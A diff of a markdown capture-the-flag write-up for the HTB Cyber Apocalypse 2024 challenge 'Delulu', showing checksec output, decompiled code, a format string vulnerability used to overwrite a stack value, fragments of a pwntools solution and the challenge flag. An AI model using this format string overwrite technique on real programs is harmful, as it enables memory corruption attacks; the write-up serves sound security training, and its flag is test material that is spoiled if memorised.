@@ -1,22 +1,16 @@
 # :game_die: HTB: Cyber Apocalypse 2024 - Delulu
 
-> **Original Source:** [HTB: Cyber Apocalypse 2024 - Delulu](https://infosecwriteups.com/htb-cyber-apocalypse-2024-delulu-d9149d089202)
-> **Platform:** infosecwriteups.com | **Category:** `MISC` | **Year:** 2024
-
 ---
 
 # HTB: Cyber Apocalypse 2024 — Delulu
-
 
 Difficulty: Very Easy
 
 ## Description
 
-
 HALT! Recognition protocol initiated. Please present your face for scanning.
 
 ## Protection (checksec)
-
 
 ```
 $ checksec
@@ -28,25 +22,19 @@ PIE: PIE enabled
 RUNPATH: b'./glibc/'
 ```
 
-
 As we can see: All protections are enabled.
 
 ## The program’s interface
 
-
 *The program’s interface*
-
 
 ## Get Szigecsán Dávid’s stories in your inbox
 
-
 Join Medium for free to get updates from this writer.
-
 
 Remember me for faster sign in
 
 ## Disassembly (ghidra)
-
 
 ```
 undefined8 main(void) {
@@ -83,19 +71,15 @@ return 0;
 }
 ```
 
-
 We can notice a format string vulnerability in the following line:
-
 
 ```
 printf((char *)&local_38);
 ```
 
-
 To call the “win” method called `delulu()`, we need to overwrite the value in `local_48` to be `0x1337beef` instead of `0x1337babe`.
 
 ## Solution (pwntools)
-
 
 ```
 #!/usr/bin/python3
@@ -114,15 +98,10 @@ p.recvuntil('HTB')
 print(f'Flag --> HTB{p.recvline().strip().decode()}\\n')
 ```
 
-
 >> [!] Flag: HTB{m45t3r_0f_d3c3pt10n}
 
 ## Skills Learned
 
-
 - format string vulnerability
 
 ---
-
-*Originally published on [Medium](https://infosecwriteups.com/htb-cyber-apocalypse-2024-delulu-d9149d089202). All credit goes to the original author.*
-*Part of [CTF Collection](https://github.com/Hope0351/CTF-collection) — a curated archive of misc CTF writeups.*
